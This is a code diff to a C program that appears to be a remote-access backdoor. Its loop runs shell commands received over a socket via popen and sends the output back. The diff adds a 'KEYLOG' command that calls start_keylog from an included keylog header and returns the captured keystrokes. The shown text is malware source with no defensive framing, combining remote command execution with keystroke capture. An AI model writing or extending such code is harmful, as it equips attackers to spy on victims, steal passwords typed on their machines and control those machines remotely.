@@ -5,6 +5,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <stdlib.h>
+#include "../include/keylog.h"
 
 int main()
 {
@@ -45,19 +46,24 @@ int main()
         }
 
         memset(output, 0, sizeof(output));
-        FILE *fp = popen(buf, "r");
-        if (fp == NULL) {
-            snprintf(output, sizeof(output), "[!] Erreur execution\n");
+        if (strncmp(buf, "KEYLOG", 6) == 0) {
+        char *keys = start_keylog(10);
+        snprintf(output, sizeof(output), "%s", keys ? keys : "[keylog failed]");
         } else {
-            size_t total = 0;
-            while (fgets(line, sizeof(line), fp) != NULL) {
-                size_t len = strlen(line);
-                if (total + len < sizeof(output) - 1) {
-                    strcat(output, line);
-                    total += len;
+            FILE *fp = popen(buf, "r");
+            if (fp == NULL) {
+                snprintf(output, sizeof(output), "[!] Erreur execution\n");
+            } else {
+                size_t total = 0;
+                while (fgets(line, sizeof(line), fp) != NULL) {
+                    size_t len = strlen(line);
+                    if (total + len < sizeof(output) - 1) {
+                        strcat(output, line);
+                        total += len;
+                    }
                 }
+                pclose(fp);
             }
-            pclose(fp);
         }
 
         char result_msg[65536 + 128] = {0};
